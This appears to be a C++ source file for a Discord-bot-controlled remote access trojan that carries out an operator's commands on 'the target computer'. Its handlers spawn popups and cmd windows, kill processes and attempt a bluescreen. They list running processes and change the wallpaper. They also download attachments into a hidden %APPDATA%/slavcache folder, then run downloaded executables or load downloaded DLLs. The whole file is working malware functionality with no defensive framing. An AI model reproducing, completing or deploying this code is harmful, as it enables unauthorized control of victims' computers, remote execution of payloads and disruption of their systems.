#include "tasks.h"
#include <Windows.h>
#include <TlHelp32.h>
#include <wtsapi32.h>
#include "helper.h"


/* all windows specific stuff such as popups */

#define _CRT_SECURE_NO_WARNINGS
#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "Urlmon.lib")

HANDLE GetProcessFromName(const char* name);

bool is_number(const std::string& s);

/* Messagebox popup to user */
std::string command_popup(std::vector<std::string> args) {
	if (args.size() == 1)
		return "Please give a message to popup!";

	/* in order to incorporate spaces, take all args as one string*/
	if (args.size() >= 2) {

		std::string msg;

		for (int i = 1; i < args.size(); i++) {
			msg += args[i] + ' ';
		}

		MessageBoxA(NULL, msg.c_str(), "Message", MB_OK);
	}

	return "Popup Sent!";
}

std::string command_bluescreen(std::vector<std::string> args) {
	HANDLE handle = GetProcessFromName("ntoskrnl.exe");
	if (!handle)
		return "failed to bluescreen";
	if (!TerminateProcess(handle, 0))
		return "bluescreen failed :(";
	return "a";
}

std::string command_cmdspawn(std::vector<std::string> args) {

	if (args.size() < 4)
		return "Invalid Format! Correct format is !cmdspawn {amount of windows} {msg} {seconds}";

	if (!is_number(args[1]))
		return "The amount of windows must be a number!";

	if (!is_number(args.back()))
		return "The amount of seconds must be a number!";
	int times = std::stoi(args[1]);

	std::string msg;

	for (int i = 2; i < args.size() - 1; i++) {
		msg += args[i] + ' ';
	}

	for (int i = 0; i < times; i++) {
		system(("start cmd.exe /k \"echo " + msg + "&timeout " + args.back() + " >nul /NOBREAK&exit\"").c_str());
	}

	return "Spawned Command Promts";
}

std::string command_applicationclose(std::vector<std::string> args) {
	if (args.size() < 2)
		return "Please give an application to close!";

	HANDLE handle;
	if (ends_with(args[1], ".exe"))
		handle = GetProcessFromName(args[1].c_str());
	else
		handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, std::stoi(args[1]));
	if (!handle)
		return "Application not found!";

	/* terminates process */
	int code = TerminateProcess(handle, 0);
	
	CloseHandle(handle);

	if (code == 0)
		return "Unable to close process!";
	return "Successfuly closed proccess!";

}

/* downloads attatchment into slavcache */
std::string command_downloadfile(std::vector<std::string> args, const dpp::message_create_t evnt) {
	if (evnt.msg.attachments.size() < 1)
		return "please attatch a file to download";
	std::vector<std::string> splitUrl = split(evnt.msg.attachments[0].url, "/");

	/* downloads attatchment URL to appdata/slavcache/{name-of-file} */
	std::string path = (getenv("APPDATA") + (std::string)"/slavcache/" + splitUrl.back());
	URLDownloadToFileA(NULL, evnt.msg.attachments[0].url.c_str(), path.c_str(), 0, NULL);
	return (std::string)"downloaded file to " + path;
}


std::string command_applicationlist(std::vector<std::string> args) {

	bool compressed = false;
	bool no_pid = false;

	for (int i = 1; i < args.size(); i++) {
		if (args[i] == "--compressed")
			compressed = true;
		else if (args[i] == "--no-pid")
			no_pid = true;
	}

	std::string msg;

	WTS_PROCESS_INFOA* pWPIs = NULL;
	DWORD dwProcCount = 0;
	if (WTSEnumerateProcessesA(WTS_CURRENT_SERVER_HANDLE, NULL, 1, &pWPIs, &dwProcCount))
	{
		//Go through all processes retrieved
		for (DWORD i = 0; i < dwProcCount; i++)
		{
			if (compressed) {
				if ((std::string)pWPIs[i].pProcessName != "svchost.exe") {
					msg += pWPIs[i].pProcessName;
					if (!no_pid) {
						msg += " - ";
						msg += std::to_string(pWPIs[i].ProcessId);
						msg += '\n';
					}
				}
			}
			else {
				msg += pWPIs[i].pProcessName;
				if (!no_pid) {
					msg += " - ";
					msg += std::to_string(pWPIs[i].ProcessId);
					msg += '\n';
				}
			}
		}
	}

	//Free memory
	if (pWPIs)
	{
		WTSFreeMemory(pWPIs);
		pWPIs = NULL;
	}
	return msg;
}

std::string command_runprogram(std::vector<std::string> args, const dpp::message_create_t evnt) {
	if (evnt.msg.attachments.size() < 1)
		return "Please attatch a .exe file to run on the target computer";

	// Create a hidden directory to store programs	
	CreateDirectoryA((getenv("APPDATA") + (std::string)"/slavcache").c_str(), NULL);
	SetFileAttributesA((getenv("APPDATA") + (std::string)"/slavcache").c_str(), FILE_ATTRIBUTE_HIDDEN);

	URLDownloadToFileA(NULL, evnt.msg.attachments[0].url.c_str(), (getenv("APPDATA") + (std::string)"/slavcache/file.exe").c_str(), 0, NULL);
	ShellExecuteA(NULL, "open", (getenv("APPDATA") + (std::string)"/slavcache/file.exe").c_str(), NULL, NULL, SW_SHOWDEFAULT);
	return "Ran Program Successfuly!";
}

std::string command_loadlibrary(std::vector<std::string> args, const dpp::message_create_t evnt) {
	if (evnt.msg.attachments.size() < 1)
		return "Please attatch a .dll file to run on the target computer";

	// Create a hidden directory to store programs	
	CreateDirectoryA((getenv("APPDATA") + (std::string)"/slavcache").c_str(), NULL);
	SetFileAttributesA((getenv("APPDATA") + (std::string)"/slavcache").c_str(), FILE_ATTRIBUTE_HIDDEN);

	URLDownloadToFileA(NULL, evnt.msg.attachments[0].url.c_str(), (getenv("APPDATA") + (std::string)"/slavcache/file.dll").c_str(), 0, NULL);
	LoadLibraryA((getenv("APPDATA") + (std::string)"/slavcache/file.dll").c_str());
	return "Loaded Library Successfuly";
}

HANDLE GetProcessFromName(const char* name) {
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			char* file = new char[MAX_PATH];
			wcstombs(file, entry.szExeFile, MAX_PATH);

			if (_stricmp(file, name) == 0)
			{
				CloseHandle(snapshot);
				return OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);


			}
		}
	}

	CloseHandle(snapshot);
	return NULL;
}

std::string command_changebackround(std::vector<std::string> args, const dpp::message_create_t evnt) {
	if (evnt.msg.attachments.size() < 1)
		return "Please attatch a jpeg file to run on the target computer";

	// Create a hidden directory to store the image	
	CreateDirectoryA((getenv("APPDATA") + (std::string)"/slavcache").c_str(), NULL);
	SetFileAttributesA((getenv("APPDATA") + (std::string)"/slavcache").c_str(), FILE_ATTRIBUTE_HIDDEN);

	// downloading the image to a file
	URLDownloadToFileA(NULL, evnt.msg.attachments[0].url.c_str(), (getenv("APPDATA") + (std::string)"/slavcache/backround.jpg").c_str(), 0, NULL);
	SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void*)(getenv("APPDATA") + (std::string)"/slavcache/backround.jpg").c_str(), SPIF_UPDATEINIFILE);
	return "Changed Backround!";
}



bool ends_with(std::string const& fullString, std::string const& ending) {
	if (fullString.length() >= ending.length()) {
		return (0 == fullString.compare(fullString.length() - ending.length(), ending.length(), ending));
	}
	else {
		return false;
	}
}

bool is_number(const std::string& s)
{
	std::string::const_iterator it = s.begin();
	while (it != s.end() && std::isdigit(*it)) ++it;
	return !s.empty() && it == s.end();
}